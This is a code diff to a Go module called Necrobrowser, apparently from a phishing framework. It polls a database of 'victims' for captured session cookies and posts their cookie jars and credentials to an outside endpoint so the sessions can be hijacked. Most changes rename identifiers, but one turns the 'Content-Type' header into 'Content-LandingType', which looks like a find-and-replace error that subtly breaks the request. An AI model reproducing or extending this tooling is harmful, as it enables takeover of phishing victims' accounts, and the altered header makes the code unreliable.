@@ -84,7 +84,7 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	m = &Necrobrowser{
 		SessionModule: session.NewSessionModule(Name, s),
-		Enabled:       s.Config.NecroBrowser.Enabled,
+		Enabled:       s.Config.Necrobrowser.Enabled,
 	}
 
 	if !m.Enabled {
@@ -92,7 +92,7 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 		return
 	}
 
-	config := s.Config.NecroBrowser
+	config := s.Config.Necrobrowser
 	m.Endpoint = config.Endpoint
 
 	m.Profile = config.Profile
@@ -107,19 +107,19 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	// spawn a go routine that checks all the victims cookie jars every N seconds
 	// to see if we have any sessions ready to be instrumented
-	if s.Config.NecroBrowser.Enabled {
+	if s.Config.Necrobrowser.Enabled {
 		m.Info("enabled")
 		go m.CheckSessions()
 
-		m.Info("trigger delay every %d seconds", s.Config.NecroBrowser.Trigger.Delay)
+		m.Info("trigger delay every %d seconds", s.Config.Necrobrowser.Trigger.Delay)
 	}
 
 	return
 }
 
 func (module *Necrobrowser) CheckSessions() {
-	triggerType := module.Session.Config.NecroBrowser.Trigger.Type
-	triggerDelay := module.Session.Config.NecroBrowser.Trigger.Delay
+	triggerType := module.Session.Config.Necrobrowser.Trigger.Type
+	triggerDelay := module.Session.Config.Necrobrowser.Trigger.Delay
 
 	for {
 		switch triggerType {
@@ -136,7 +136,7 @@ func (module *Necrobrowser) CheckSessions() {
 }
 
 func (module *Necrobrowser) CheckSessionCookies() {
-	triggerValues := module.Session.Config.NecroBrowser.Trigger.Values
+	triggerValues := module.Session.Config.Necrobrowser.Trigger.Values
 
 	victims, err := db.GetAllVictims()
 	if err != nil {
@@ -154,7 +154,7 @@ func (module *Necrobrowser) CheckSessionCookies() {
 
 		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
 		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
-			//create Credential struct
+			// create Credential struct
 			type Creds struct {
 				Username string `json:"username"`
 				Password string `json:"password"`
@@ -232,12 +232,12 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
 	client := resty.New()
 	resp, err := client.R().
-		SetHeader("Content-Type", "application/json").
+		SetHeader("Content-LandingType", "application/json").
 		SetBody(newRequest).
 		Post(module.Endpoint)
 
 	if err != nil {
-		module.Warning("Error sending request to NecroBrowser: %s", err)
+		module.Warning("Error sending request to Necrobrowser: %s", err)
 		return
 	}
 
